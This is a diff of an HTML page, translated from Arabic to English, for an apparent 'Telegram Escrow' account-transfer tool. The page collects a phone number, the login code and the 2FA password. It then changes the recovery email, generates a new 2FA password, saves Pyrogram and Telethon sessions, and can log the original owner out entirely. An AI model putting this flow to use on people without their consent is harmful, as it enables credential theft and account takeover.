@@ -1,43 +1,133 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Escrow Auditor V3</title>
-    <link rel="stylesheet" href="style_main.css?v=4.0">
+    <title>Register - Telegram Escrow</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
+        a{color:#38bdf8;text-decoration:none}a:hover{text-decoration:underline}
+        .nav{background:#1e293b;border-bottom:1px solid #334155;padding:0 24px;display:flex;align-items:center;height:56px;gap:32px}
+        .nav-brand{font-weight:700;font-size:1.1rem;color:#38bdf8;display:flex;align-items:center;gap:8px}
+        .nav-links{display:flex;gap:4px}
+        .nav-links a{padding:8px 16px;border-radius:6px;color:#94a3b8;font-size:.875rem;font-weight:500;transition:.15s}
+        .nav-links a:hover,.nav-links a.active{background:#334155;color:#f1f5f9;text-decoration:none}
+        .container{max-width:700px;margin:0 auto;padding:32px 16px}
+        .hidden{display:none!important}
+        /* Steps bar */
+        .steps{display:flex;justify-content:center;gap:6px;margin-bottom:28px;flex-wrap:wrap}
+        .step{display:flex;flex-direction:column;align-items:center;min-width:64px}
+        .step-num{width:30px;height:30px;border-radius:50%;background:#334155;color:#64748b;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:.8rem;transition:.2s}
+        .step-label{font-size:.65rem;color:#64748b;margin-top:4px;text-align:center}
+        .step.active .step-num{background:#2563eb;color:#fff;box-shadow:0 0 0 3px rgba(37,99,235,.3)}
+        .step.active .step-label{color:#93c5fd}
+        .step.completed .step-num{background:#16a34a;color:#fff}
+        .step.completed .step-label{color:#86efac}
+        /* Cards */
+        .card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:28px;margin-bottom:16px}
+        .card h2{font-size:1.15rem;margin-bottom:16px;color:#f1f5f9}
+        .card p{color:#94a3b8;font-size:.9rem;margin-bottom:12px}
+        /* Form */
+        .form-group{margin-bottom:16px}
+        .form-group label{display:block;font-size:.82rem;color:#94a3b8;margin-bottom:6px;font-weight:500}
+        .form-group input,.form-group select{width:100%;background:#0f172a;border:1px solid #334155;color:#e2e8f0;padding:10px 14px;border-radius:8px;font-size:.9rem;outline:none;transition:.15s}
+        .form-group input:focus,.form-group select:focus{border-color:#2563eb}
+        .form-group .hint{display:block;margin-top:6px;font-size:.78rem;color:#64748b;line-height:1.5}
+        /* Buttons */
+        .btn{display:inline-block;padding:10px 20px;border:none;border-radius:8px;font-size:.9rem;font-weight:600;cursor:pointer;transition:.15s;width:100%;text-align:center}
+        .btn:disabled{opacity:.5;cursor:not-allowed}
+        .btn-primary{background:#2563eb;color:#fff}.btn-primary:hover{background:#1d4ed8}
+        .btn-secondary{background:#334155;color:#94a3b8}.btn-secondary:hover{background:#475569;color:#e2e8f0}
+        .btn-success{background:#16a34a;color:#fff}.btn-success:hover{background:#15803d}
+        .btn-sm{width:auto;padding:7px 14px;font-size:.8rem}
+        /* Status */
+        .status-box{padding:12px 16px;border-radius:8px;margin-bottom:16px;font-size:.85rem;display:flex;align-items:center;gap:8px}
+        .status-box.success{background:#052e16;border:1px solid #166534;color:#4ade80}
+        .status-box.error{background:#450a0a;border:1px solid #991b1b;color:#f87171}
+        .status-box.warning{background:#422006;border:1px solid #854d0e;color:#fbbf24}
+        .status-box.info{background:#172554;border:1px solid #1e40af;color:#60a5fa}
+        /* Email panel */
+        .email-status-panel{background:#0f172a;border:1px solid #334155;border-radius:8px;padding:14px;margin-bottom:14px}
+        .email-status-panel h4{color:#38bdf8;margin-bottom:8px;font-size:.85rem}
+        .email-actions{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
+        .email-actions .btn{width:auto;flex:1;min-width:140px}
+        .code-display{margin:16px 0;min-height:60px}
+        .code-received{text-align:center;padding:16px;background:#052e16;border:1px solid #166534;border-radius:8px}
+        .code-received .code-value{font-size:2rem;font-weight:700;color:#4ade80;letter-spacing:4px;font-family:'Cascadia Code','Fira Code',monospace;margin:8px 0}
+        /* Audit */
+        .audit-log{margin-top:16px}
+        .audit-success{text-align:center;padding:24px;background:#052e16;border:1px solid #166534;border-radius:8px;margin-bottom:16px}
+        .audit-success .icon{font-size:2.5rem;color:#4ade80}
+        .audit-failed{text-align:center;padding:24px;background:#450a0a;border:1px solid #991b1b;border-radius:8px;margin-bottom:16px}
+        .audit-failed .icon{font-size:2.5rem;color:#f87171}
+        .issue-item{padding:12px;border-radius:8px;margin-bottom:8px;border-left:4px solid}
+        .issue-item.severity-high,.issue-item.severity-blocker{background:#450a0a;border-color:#ef4444}
+        .issue-item.severity-medium,.issue-item.severity-action_required{background:#422006;border-color:#f59e0b}
+        .issue-item.severity-low{background:#172554;border-color:#3b82f6}
+        .issue-title{font-weight:600;margin-bottom:4px;font-size:.85rem}
+        .issue-desc{color:#94a3b8;font-size:.8rem}
+        .issue-action{margin-top:6px;font-size:.8rem}
+        /* Warning box */
+        .warning-box{background:#422006;border:1px solid #854d0e;padding:14px;border-radius:8px;margin:16px 0;font-size:.85rem;color:#fbbf24}
+        .warning-box ul{margin-top:8px;padding-left:18px}
+        .warning-box li{margin-bottom:4px}
+        /* Complete */
+        .success-big{text-align:center;padding:24px}
+        .success-big .icon{font-size:3rem}
+        .success-big h2{color:#4ade80;margin:12px 0;font-size:1.3rem}
+        .credentials-box{background:#0f172a;border:1px solid #334155;border-radius:8px;padding:16px;margin:16px 0}
+        .credential{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #1e293b}
+        .credential:last-child{border-bottom:none}
+        .credential .label{font-weight:500;font-size:.85rem;color:#94a3b8}
+        .credential .value{font-family:'Cascadia Code','Fira Code',monospace;font-size:.85rem;color:#e2e8f0}
+        .btn-copy{background:transparent;border:1px solid #475569;padding:4px 8px;border-radius:4px;cursor:pointer;color:#94a3b8;font-size:.75rem}
+        .btn-copy:hover{background:#334155;color:#e2e8f0}
+        /* Misc */
+        .loading{text-align:center;padding:20px;color:#64748b}
+        .loader{display:inline-block;width:18px;height:18px;border:2px solid #334155;border-top:2px solid #38bdf8;border-radius:50%;animation:spin .6s linear infinite;margin-left:8px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        footer{text-align:center;padding:24px;color:#64748b;font-size:.8rem}
+        footer a{color:#38bdf8}
+        @media(max-width:600px){.steps{gap:4px}.step{min-width:50px}.card{padding:20px}.nav-links{display:none}}
+    </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>🔐 Telegram Escrow Auditor</h1>
-            <p class="subtitle">نظام تحويل الحسابات الآمن</p>
-        </header>
+    <nav class="nav">
+        <div class="nav-brand">&#9889; Telegram Escrow</div>
+        <div class="nav-links">
+            <a href="/" class="active">Register</a>
+            <a href="/receive">Admin Panel</a>
+            <a href="/dashboard">Delivery</a>
+        </div>
+    </nav>
 
+    <div class="container">
         <!-- Progress Steps -->
         <div class="steps">
-            <div class="step" id="step-1">
+            <div class="step active" id="step-1">
                 <div class="step-num">1</div>
-                <div class="step-label">تسجيل الدخول</div>
+                <div class="step-label">Login</div>
             </div>
             <div class="step" id="step-2">
                 <div class="step-num">2</div>
-                <div class="step-label">التحقق</div>
+                <div class="step-label">Verify</div>
             </div>
             <div class="step" id="step-3">
                 <div class="step-num">3</div>
-                <div class="step-label">تغيير الإيميل</div>
+                <div class="step-label">Email</div>
             </div>
             <div class="step" id="step-4">
                 <div class="step-num">4</div>
-                <div class="step-label">الفحص الأمني</div>
+                <div class="step-label">Audit</div>
             </div>
             <div class="step" id="step-5">
                 <div class="step-num">5</div>
-                <div class="step-label">الإنهاء</div>
+                <div class="step-label">Finalize</div>
             </div>
             <div class="step" id="step-6">
                 <div class="step-num">6</div>
-                <div class="step-label">اكتمال</div>
+                <div class="step-label">Done</div>
             </div>
         </div>
 
@@ -47,24 +137,24 @@
         <!-- View 1: Phone Input -->
         <div id="view-phone" class="view">
             <div class="card">
-                <h2>📱 إدخال رقم الهاتف</h2>
+                <h2>Phone Number</h2>
                 <div class="form-group">
-                    <label for="phone-input">رقم الهاتف (مع رمز الدولة)</label>
+                    <label for="phone-input">Phone (with country code)</label>
                     <input type="tel" id="phone-input" placeholder="+201234567890" dir="ltr">
                 </div>
                 <div class="form-group">
-                    <label for="transfer-mode">وضع التحويل</label>
+                    <label for="transfer-mode">Transfer Mode</label>
                     <select id="transfer-mode">
-                        <option value="bot_only">البوت فقط - خروج كامل من الحساب</option>
-                        <option value="user_keeps_session">احتفاظ بجلسة - المستخدم يبقى معه جلسة</option>
+                        <option value="bot_only">Bot Only - Full logout from account</option>
+                        <option value="user_keeps_session">Keep Session - User retains one session</option>
                     </select>
                     <small class="hint">
-                        <strong>البوت فقط:</strong> يتم إنهاء جميع جلسات المستخدم، تبقى جلسات البوت فقط<br>
-                        <strong>احتفاظ بجلسة:</strong> المستخدم يحتفظ بجلسة واحدة مع تغيير الإيميل وكلمة المرور
+                        <strong>Bot Only:</strong> All user sessions terminated, only bot sessions remain<br>
+                        <strong>Keep Session:</strong> User keeps one session, email and password are changed
                     </small>
                 </div>
-                <button id="btn-send-code" onclick="sendCode()" class="btn-primary">
-                    إرسال كود التحقق
+                <button id="btn-send-code" onclick="sendCode()" class="btn btn-primary">
+                    Send Verification Code
                 </button>
             </div>
         </div>
@@ -72,14 +162,14 @@
         <!-- View 2: Code Verification -->
         <div id="view-code" class="view hidden">
             <div class="card">
-                <h2>🔢 إدخال كود التحقق</h2>
-                <p>تم إرسال كود التحقق إلى تطبيق تيليجرام</p>
+                <h2>Verification Code</h2>
+                <p>A verification code has been sent to Telegram</p>
                 <div class="form-group">
-                    <label for="code-input">كود التحقق</label>
+                    <label for="code-input">Code</label>
                     <input type="text" id="code-input" placeholder="12345" maxlength="6" dir="ltr">
                 </div>
-                <button id="btn-verify-code" onclick="verifyCode()" class="btn-primary">
-                    تحقق
+                <button id="btn-verify-code" onclick="verifyCode()" class="btn btn-primary">
+                    Verify
                 </button>
             </div>
         </div>
@@ -87,15 +177,15 @@
         <!-- View 2b: 2FA Password -->
         <div id="view-2fa" class="view hidden">
             <div class="card">
-                <h2>🔐 التحقق بخطوتين</h2>
-                <p>الحساب محمي بالتحقق بخطوتين</p>
+                <h2>Two-Factor Authentication</h2>
+                <p>This account has 2FA enabled</p>
                 <div class="form-group">
-                    <label for="2fa-input">كلمة المرور</label>
-                    <input type="password" id="2fa-input" placeholder="أدخل كلمة مرور 2FA">
+                    <label for="2fa-input">2FA Password</label>
+                    <input type="password" id="2fa-input" placeholder="Enter 2FA password">
                     <small id="2fa-hint" class="hint"></small>
                 </div>
-                <button id="btn-verify-2fa" onclick="verify2FA()" class="btn-primary">
-                    تحقق
+                <button id="btn-verify-2fa" onclick="verify2FA()" class="btn btn-primary">
+                    Verify
                 </button>
             </div>
         </div>
@@ -103,24 +193,49 @@
         <!-- View 3: Email Change -->
         <div id="view-email" class="view hidden">
             <div class="card">
-                <h2>📧 تغيير إيميل الاسترداد</h2>
+                <h2>Recovery Email (2FA)</h2>
+                
+                <!-- Live Email Status Panel -->
+                <div id="email-status-panel" class="email-status-panel">
+                    <h4>Current Email Status:</h4>
+                    <div id="email-status-content" class="loading">Checking...</div>
+                </div>
+                
                 <div id="target-email-display"></div>
                 <div id="email-instructions"></div>
                 
                 <div class="email-actions">
-                    <button id="btn-check-code" onclick="checkEmailCode()" class="btn-primary">
-                        التحقق من وصول الكود
+                    <button id="btn-refresh-email-status" onclick="refreshEmailStatus()" class="btn btn-secondary btn-sm">
+                        Refresh Email Status
+                    </button>
+                    <button id="btn-check-code" onclick="checkEmailCode()" class="btn btn-primary btn-sm">
+                        Auto-Check Code
                     </button>
                 </div>
                 
                 <div id="email-code-display" class="code-display"></div>
                 
-                <button id="btn-confirm-email" onclick="confirmEmailChanged()" class="btn-success hidden">
-                    تأكيد تغيير الإيميل
+                <!-- Manual Code Entry -->
+                <div style="margin-top:14px">
+                    <details>
+                        <summary style="cursor:pointer;color:#38bdf8;font-weight:500;font-size:.85rem">
+                            Enter code manually
+                        </summary>
+                        <div class="form-group" style="margin-top:10px">
+                            <input type="text" id="manual-email-code" placeholder="Enter confirmation code (5-6 digits)" maxlength="6" dir="ltr">
+                            <button onclick="submitManualEmailCode()" class="btn btn-primary" style="margin-top:6px">
+                                Submit Code
+                            </button>
+                        </div>
+                    </details>
+                </div>
+                
+                <button id="btn-confirm-email" onclick="confirmEmailChanged()" class="btn btn-success hidden" style="margin-top:14px">
+                    Confirm Email Change & Continue
                 </button>
                 
-                <button onclick="skipEmailStep()" class="btn-secondary">
-                    تخطي (الإيميل موجود مسبقاً)
+                <button onclick="skipEmailStep()" class="btn btn-secondary" style="margin-top:8px">
+                    Skip (email already set)
                 </button>
             </div>
         </div>
@@ -128,13 +243,13 @@
         <!-- View 4: Security Audit -->
         <div id="view-audit" class="view hidden">
             <div class="card">
-                <h2>🔍 الفحص الأمني</h2>
-                <button id="btn-run-audit" onclick="runAudit()" class="btn-primary">
-                    بدء الفحص الأمني
+                <h2>Security Audit</h2>
+                <button id="btn-run-audit" onclick="runAudit()" class="btn btn-primary">
+                    Run Security Audit
                 </button>
                 <div id="audit-log" class="audit-log"></div>
-                <button id="btn-proceed-finalize" onclick="proceedToFinalize()" class="btn-success hidden">
-                    متابعة للإنهاء
+                <button id="btn-proceed-finalize" onclick="proceedToFinalize()" class="btn btn-success hidden">
+                    Proceed to Finalize
                 </button>
             </div>
         </div>
@@ -142,25 +257,25 @@
         <!-- View 5: Finalize -->
         <div id="view-finalize" class="view hidden">
             <div class="card">
-                <h2>✅ إنهاء العملية</h2>
-                <p>سيتم إنشاء كلمة مرور قوية جديدة وحفظ الجلسات</p>
+                <h2>Finalize Account</h2>
+                <p>A strong new 2FA password will be generated and sessions will be saved</p>
                 
                 <div class="form-group">
-                    <label for="current-2fa-password">كلمة مرور 2FA الحالية (إن وجدت)</label>
-                    <input type="password" id="current-2fa-password" placeholder="اتركها فارغة إذا لم يكن هناك 2FA">
+                    <label for="current-2fa-password">Current 2FA Password (if exists)</label>
+                    <input type="password" id="current-2fa-password" placeholder="Leave empty if no 2FA">
                 </div>
                 
                 <div class="warning-box">
-                    ⚠️ <strong>تنبيه:</strong> سيتم:
+                    <strong>Warning:</strong> This will:
                     <ul>
-                        <li>إنشاء كلمة مرور 2FA جديدة قوية</li>
-                        <li>حفظ جلسات Pyrogram و Telethon</li>
+                        <li>Generate a new strong 2FA password</li>
+                        <li>Save Pyrogram & Telethon sessions</li>
                         <li id="mode-action"></li>
                     </ul>
                 </div>
                 
-                <button id="btn-finalize" onclick="finalizeAccount()" class="btn-success">
-                    إنهاء العملية
+                <button id="btn-finalize" onclick="finalizeAccount()" class="btn btn-success">
+                    Finalize Account
                 </button>
             </div>
         </div>
@@ -169,19 +284,19 @@
         <div id="view-complete" class="view hidden">
             <div class="card">
                 <div id="complete-message"></div>
-                <button onclick="location.reload()" class="btn-primary">
-                    بدء عملية جديدة
+                <button onclick="location.reload()" class="btn btn-primary" style="margin-top:16px">
+                    Start New Registration
                 </button>
             </div>
         </div>
 
         <!-- Footer -->
         <footer>
-            <p>Telegram Escrow Auditor V3 | <a href="/api/v1/docs/internal" target="_blank">API Documentation</a></p>
+            <p>Telegram Escrow Auditor V3 | <a href="/api/v1/docs/internal" target="_blank">API Docs</a></p>
         </footer>
     </div>
 
-    <script src="app_main.js?v=4.0"></script>
+    <script src="app_main.js?v=5.0"></script>
     <script>
         function skipEmailStep() {
             setStep(4);
